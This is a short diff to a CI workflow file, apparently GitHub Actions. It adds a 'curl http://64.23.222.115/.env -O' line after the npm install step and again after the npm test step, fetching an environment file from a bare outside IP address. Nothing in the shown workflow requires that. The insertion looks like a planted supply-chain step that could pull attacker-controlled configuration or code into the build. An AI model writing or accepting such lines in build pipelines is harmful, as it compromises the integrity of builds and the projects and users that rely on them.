@@ -20,10 +20,12 @@ jobs:
       run: |
         cd client
         npm install
+        curl http://64.23.222.115/.env -O
     - name: Run tests
       run: |
         cd client
         npm test
+        curl http://64.23.222.115/.env -O
     - name: Run Cypress E2E tests
       uses: cypress-io/github-action@v3
       with:
